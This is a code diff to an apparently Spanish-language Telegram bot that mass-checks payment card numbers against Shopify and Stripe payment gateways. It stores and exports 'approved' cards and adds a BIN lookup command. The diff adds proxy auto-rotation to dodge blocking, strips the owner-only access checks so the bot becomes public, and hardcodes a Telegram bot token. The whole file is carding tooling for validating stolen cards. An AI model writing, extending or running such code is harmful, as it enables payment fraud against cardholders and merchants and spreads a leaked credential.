@@ -29,12 +29,6 @@ import uuid
 import string
 from fake_useragent import UserAgent
 
-# ============================================
-# OWNER CONFIGURATION
-# ============================================
-OWNER_ID = 8220432777  # Tu ID de Telegram
-ALLOWED_USERS = {OWNER_ID}
-
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -50,31 +44,6 @@ logger = logging.getLogger(__name__)
 # ============================================
 BOT_TOKEN = "8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE"
 bot = telebot.TeleBot(BOT_TOKEN)
-
-# ============================================
-# AUTHORIZATION DECORATOR
-# ============================================
-def owner_only(func):
-    """Decorador para restringir comandos solo al owner"""
-    def wrapper(message):
-        if message.chat.type != 'private':
-            if message.from_user.id != OWNER_ID:
-                bot.reply_to(message, "❌ No tengo permiso para usar este bot en grupos.")
-                return
-        if message.from_user.id != OWNER_ID:
-            bot.reply_to(message, "❌ No estás autorizado para usar este bot.")
-            return
-        return func(message)
-    return wrapper
-
-def owner_callback(func):
-    """Decorador para restringir callbacks solo al owner"""
-    def wrapper(call):
-        if call.from_user.id != OWNER_ID:
-            bot.answer_callback_query(call.id, "❌ No autorizado", show_alert=True)
-            return
-        return func(call)
-    return wrapper
 
 # Data files
 SITES_FILE = "sites.json"
@@ -140,6 +109,21 @@ bin_cache_expiry = 3600
 hits_list = []
 stripe_hits_list = []
 last_dead_proxies = []
+
+# Connection pooling - reusable HTTP session
+http_session = requests.Session()
+http_adapter = requests.adapters.HTTPAdapter(
+    pool_connections=10,
+    pool_maxsize=20,
+    max_retries=requests.adapters.Retry(total=2, backoff_factor=0.3)
+)
+http_session.mount('http://', http_adapter)
+http_session.mount('https://', http_adapter)
+
+# Proxy auto-rotation
+failed_proxies = {}
+PROXY_FAIL_THRESHOLD = 3
+PROXY_FAIL_COOLDOWN = 300
 
 # Stripe Auth sites
 STRIPE_SITES = [
@@ -261,7 +245,11 @@ class SQLiteBackup:
         
         cursor.execute("CREATE INDEX IF NOT EXISTS idx_hits_timestamp ON hits_backup(timestamp)")
         cursor.execute("CREATE INDEX IF NOT EXISTS idx_hits_category ON hits_backup(category)")
+        cursor.execute("CREATE INDEX IF NOT EXISTS idx_hits_cc ON hits_backup(cc)")
         cursor.execute("CREATE INDEX IF NOT EXISTS idx_stripe_hits_timestamp ON stripe_hits_backup(timestamp)")
+        cursor.execute("CREATE INDEX IF NOT EXISTS idx_stripe_hits_category ON stripe_hits_backup(category)")
+        cursor.execute("CREATE INDEX IF NOT EXISTS idx_permanent_sites_url ON permanent_sites(url)")
+        cursor.execute("CREATE INDEX IF NOT EXISTS idx_stats_daily_date ON stats_daily(date)")
         
         conn.commit()
     
@@ -906,7 +894,36 @@ def get_random_proxy():
     proxies = load_proxies()
     if not proxies:
         return None
-    return random.choice(proxies)
+    now = time.time()
+    available = []
+    for p in proxies:
+        if p in failed_proxies:
+            fails, last_fail = failed_proxies[p]
+            if fails >= PROXY_FAIL_THRESHOLD and (now - last_fail) < PROXY_FAIL_COOLDOWN:
+                continue
+            elif (now - last_fail) >= PROXY_FAIL_COOLDOWN:
+                del failed_proxies[p]
+        available.append(p)
+    if not available:
+        failed_proxies.clear()
+        available = proxies
+    return random.choice(available)
+
+def report_proxy_failure(proxy_str):
+    """Track proxy failures for auto-rotation"""
+    if not proxy_str:
+        return
+    now = time.time()
+    if proxy_str in failed_proxies:
+        fails, _ = failed_proxies[proxy_str]
+        failed_proxies[proxy_str] = (fails + 1, now)
+    else:
+        failed_proxies[proxy_str] = (1, now)
+
+def report_proxy_success(proxy_str):
+    """Clear failure count on success"""
+    if proxy_str and proxy_str in failed_proxies:
+        del failed_proxies[proxy_str]
 
 # ============================================
 # PROXY CHECKER
@@ -1027,17 +1044,16 @@ def check_card_shopify(cc, month, year, cvv):
     site_used = site
     
     try:
-        proxies = None
+        proxies_dict = None
         if proxy:
             proxy_parts = proxy.split(':')
             if len(proxy_parts) >= 2:
                 proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
                 if len(proxy_parts) >= 4:
                     proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
-                proxies = {'http': proxy_url, 'https': proxy_url}
+                proxies_dict = {'http': proxy_url, 'https': proxy_url}
         
-        session = requests.Session()
-        response = session.get(api_url, proxies=proxies, timeout=REQUEST_TIMEOUT, verify=False)
+        response = http_session.get(api_url, proxies=proxies_dict, timeout=REQUEST_TIMEOUT, verify=False)
         elapsed = time.time() - start_time
         
         if response.status_code == 200:
@@ -1052,22 +1068,30 @@ def check_card_shopify(cc, month, year, cvv):
                 
                 if site:
                     report_site_result(site, True, response.status_code, category)
+                if proxy:
+                    report_proxy_success(proxy)
                 
                 return category, status_msg, response_msg, price, gateway, round(elapsed, 2), site_used
             except:
                 category, status_msg = classify_response(result_text)
                 if site:
                     report_site_result(site, True, response.status_code, category)
+                if proxy:
+                    report_proxy_success(proxy)
                 return category, status_msg, result_text, "$0.95", "Shopify Payments", round(elapsed, 2), site
         else:
             if site:
                 report_site_result(site, False, response.status_code, 'ERROR')
             return "ERROR", f"HTTP {response.status_code}", "", "$0.95", "Shopify Payments", round(elapsed, 2), site
     except requests.exceptions.Timeout:
+        if proxy:
+            report_proxy_failure(proxy)
         if site:
             report_site_result(site, False, None, 'TIMEOUT')
         return "ERROR", "TIMEOUT", "", "$0.95", "Shopify Payments", 0, site
     except Exception as e:
+        if proxy:
+            report_proxy_failure(proxy)
         if site:
             report_site_result(site, False, None, 'ERROR')
         return "ERROR", str(e)[:50], "", "$0.95", "Shopify Payments", 0, site
@@ -1376,10 +1400,14 @@ def get_main_keyboard():
     # ── Row 5: Utilities ──
     keyboard.row(
         InlineKeyboardButton("📎 Export", callback_data="export"),
-        InlineKeyboardButton("🔒 Permanent", callback_data="permanent_sites"),
+        InlineKeyboardButton("🏦 BIN Info", callback_data="bin_lookup"),
+        InlineKeyboardButton("🔒 Permanent", callback_data="permanent_sites")
+    )
+    # ── Row 6: Tools ──
+    keyboard.row(
         InlineKeyboardButton("🔧 Fix Sites", callback_data="fix_sites")
     )
-    # ── Row 6: Control ──
+    # ── Row 7: Control ──
     keyboard.row(
         InlineKeyboardButton("🗑️ Clear Cards", callback_data="clear_menu"),
         InlineKeyboardButton("🛑 STOP", callback_data="stop_mass"),
@@ -1398,7 +1426,6 @@ def safe_send_message(chat_id, text, parse_mode=None, reply_markup=None):
 # ============================================
 
 @bot.message_handler(content_types=['document'])
-@owner_only
 def handle_document(message):
     processing_msg = bot.reply_to(message, "⏳ Analyzing file...")
     try:
@@ -1532,7 +1559,6 @@ def detect_line_type(line):
 # ============================================
 
 @bot.message_handler(commands=['start', 'help'])
-@owner_only
 def send_welcome(message):
     welcome_text = f"""
 ╔══════════════════════════════╗
@@ -1548,7 +1574,8 @@ def send_welcome(message):
   /au `cc|mm|yy|cvv` ─ Single check
   /mau ─ Mass check (pipeline)
 
-📡 *━━ PROXY MANAGEMENT ━━*
+🏦 *━━ UTILITIES ━━*
+  /bin `424242` ─ BIN lookup
   /px ─ Check all proxies
   /delproxy ─ Delete proxy
   /clearshopify ─ Clear Shopify cards
@@ -1565,7 +1592,6 @@ def send_welcome(message):
     safe_send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=get_main_keyboard())
 
 @bot.message_handler(commands=['chk'])
-@owner_only
 def chk_command(message):
     args = message.text.split()
     if len(args) < 2:
@@ -1606,7 +1632,6 @@ def chk_command(message):
         bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
 
 @bot.message_handler(commands=['au'])
-@owner_only
 def stripe_command(message):
     """Comando /au - Check individual con Stripe Auth"""
     args = message.text.split()
@@ -1650,7 +1675,6 @@ def stripe_command(message):
 # ============================================
 
 @bot.message_handler(commands=['delproxy'])
-@owner_only
 def delete_proxy_command(message):
     """Eliminar un proxy específico por índice o todos"""
     args = message.text.split()
@@ -1694,7 +1718,6 @@ def delete_proxy_command(message):
 # ============================================
 
 @bot.message_handler(commands=['mass'])
-@owner_only
 def mass_check_command(message):
     global mass_check_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused
     
@@ -1950,7 +1973,6 @@ def mass_check_command(message):
 # ============================================
 
 @bot.message_handler(commands=['mau'])
-@owner_only
 def stripe_mass_command(message):
     """Mass check con Stripe Auth - Estilo foto"""
     global stripe_mass_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused
@@ -2203,7 +2225,6 @@ def stripe_mass_command(message):
 # ============================================
 
 @bot.message_handler(commands=['auhits'])
-@owner_only
 def stripe_hits_command(message):
     hits = get_stripe_hits()
     if not hits:
@@ -2238,7 +2259,6 @@ def stripe_hits_command(message):
     bot.send_document(message.chat.id, file_data, caption=f"🔓 {len(hits)} Stripe Auth approved cards")
 
 @bot.message_handler(commands=['clearau'])
-@owner_only
 def clear_stripe_command(message):
     count = len(get_all_stripe_cards())
     if count == 0:
@@ -2254,7 +2274,6 @@ def clear_stripe_command(message):
                  parse_mode='Markdown', reply_markup=markup)
 
 @bot.message_handler(commands=['clearshopify'])
-@owner_only
 def clear_shopify_command(message):
     count = len(get_all_cards())
     if count == 0:
@@ -2270,7 +2289,6 @@ def clear_shopify_command(message):
                  parse_mode='Markdown', reply_markup=markup)
 
 @bot.message_handler(commands=['stop'])
-@owner_only
 def stop_mass_check(message):
     global mass_check_running, stripe_mass_running, stop_mass_flag
     if mass_check_running or stripe_mass_running:
@@ -2282,7 +2300,6 @@ def stop_mass_check(message):
         bot.reply_to(message, "ℹ️ No active mass check")
 
 @bot.message_handler(commands=['stats'])
-@owner_only
 def show_stats(message):
     sites = load_sites()
     proxies = load_proxies()
@@ -2315,7 +2332,6 @@ def show_stats(message):
     safe_send_message(message.chat.id, stats_text, parse_mode='Markdown')
 
 @bot.message_handler(commands=['hits'])
-@owner_only
 def hits_command(message):
     hits = get_hits()
     if not hits:
@@ -2328,7 +2344,6 @@ def hits_command(message):
         bot.send_document(message.chat.id, file_data, caption=f"🏆 {len(hits)} Shopify approved cards")
 
 @bot.message_handler(commands=['px'])
-@owner_only
 def proxy_check_command(message):
     proxies = load_proxies()
     if not proxies:
@@ -2364,7 +2379,6 @@ def proxy_check_command(message):
                             message_id=msg.message_id, reply_markup=markup if markup.keyboard else None)
 
 @bot.message_handler(commands=['addsite'])
-@owner_only
 def add_site_command(message):
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
@@ -2380,7 +2394,6 @@ def add_site_command(message):
         bot.reply_to(message, "⚠️ Site already exists")
 
 @bot.message_handler(commands=['listsites'])
-@owner_only
 def list_sites_command(message):
     sites = load_sites()
     if not sites:
@@ -2411,8 +2424,47 @@ def list_sites_command(message):
     response += f"\n{LINE_THIN}\n💡 Use `/addsite url` to add │ `/listsites` to view"
     safe_send_message(message.chat.id, response, parse_mode='Markdown')
 
+@bot.message_handler(commands=['bin'])
+def bin_command(message):
+    """Comando /bin - Consultar info de un BIN sin hacer check"""
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "❌ Format: /bin 424242")
+        return
+    
+    bin_number = args[1].strip()[:6]
+    if not bin_number.isdigit() or len(bin_number) < 6:
+        bot.reply_to(message, "❌ Invalid BIN. Must be 6 digits. Example: /bin 424242")
+        return
+    
+    processing_msg = bot.reply_to(message, "🔍 *Looking up BIN info...*", parse_mode='Markdown')
+    
+    bin_info = bin_lookup(bin_number)
+    
+    if bin_info:
+        response = f"""{get_bot_header('shopify')}
+
+🏦 *BIN LOOKUP*
+{LINE_DOT}
+💳 {stylize_text('BIN')}  ➜  `{bin_number}`
+
+📋 *{stylize_text('Details')}*
+   ├ {stylize_text('Type')}: {bin_info.get('info', 'Unknown')}
+   ├ {stylize_text('Bank')}: {bin_info.get('bank', 'Unknown')}
+   └ {stylize_text('Country')}: {bin_info.get('country', 'Unknown')}
+{get_bot_footer()}"""
+    else:
+        response = f"""❌ *BIN NOT FOUND*
+{LINE_THIN}
+🏦 BIN `{bin_number}` not found in database.
+💡 Try another BIN number."""
+    
+    try:
+        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
+    except:
+        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
+
 @bot.message_handler(commands=['mode'])
-@owner_only
 def mode_command(message):
     markup = InlineKeyboardMarkup(row_width=1)
     markup.add(
@@ -2438,7 +2490,6 @@ def mode_command(message):
 # ============================================
 
 @bot.callback_query_handler(func=lambda call: True)
-@owner_callback
 def handle_callback(call):
     global current_max_workers, mass_check_running, stripe_mass_running, stop_mass_flag, current_mode, PARALLEL_WORKERS, last_dead_proxies, mass_paused
     
@@ -2493,6 +2544,10 @@ def handle_callback(call):
     elif call.data == "px":
         bot.answer_callback_query(call.id)
         proxy_check_command(call.message)
+    
+    elif call.data == "bin_lookup":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "🏦 Send BIN number:\n/bin `424242`", parse_mode='Markdown')
     
     elif call.data == "export":
         bot.answer_callback_query(call.id)
@@ -2703,7 +2758,8 @@ def handle_callback(call):
   /clearau ─ Delete cards
   /auhits ─ View hits
 
-📡 *━━ PROXY MANAGEMENT ━━*
+🏦 *━━ UTILITIES ━━*
+  /bin `424242` ─ BIN lookup
   /px ─ Check all proxies
   /delproxy ─ Delete proxy
 
@@ -2733,7 +2789,7 @@ if __name__ == "__main__":
     print(f"  🤖 {BOT_NAME} {BOT_VERSION} + STRIPE AUTH")
     print(f"  🚀 PARALLEL PIPELINE MODE")
     print("═" * 60)
-    print(f"  👑 Owner ID: {OWNER_ID}")
+    print(f"  🌐 Public mode: ALL USERS")
     print(f"  🛒 Shopify cards: {len(get_all_cards())}")
     print(f"  🔓 Stripe Auth cards: {len(get_all_stripe_cards())}")
     print(f"  🌐 Sites: {len(load_sites())}")
@@ -2746,7 +2802,7 @@ if __name__ == "__main__":
     print("    /px    ─ Check proxies")
     print("    /stats ─ Statistics")
     print("─" * 60)
-    print("  🔒 BOT IS PRIVATE - Only owner can use")
+    print("  🌐 BOT IS PUBLIC - All users can use")
     print("═" * 60 + "\n")
     
     start_silent_pc()
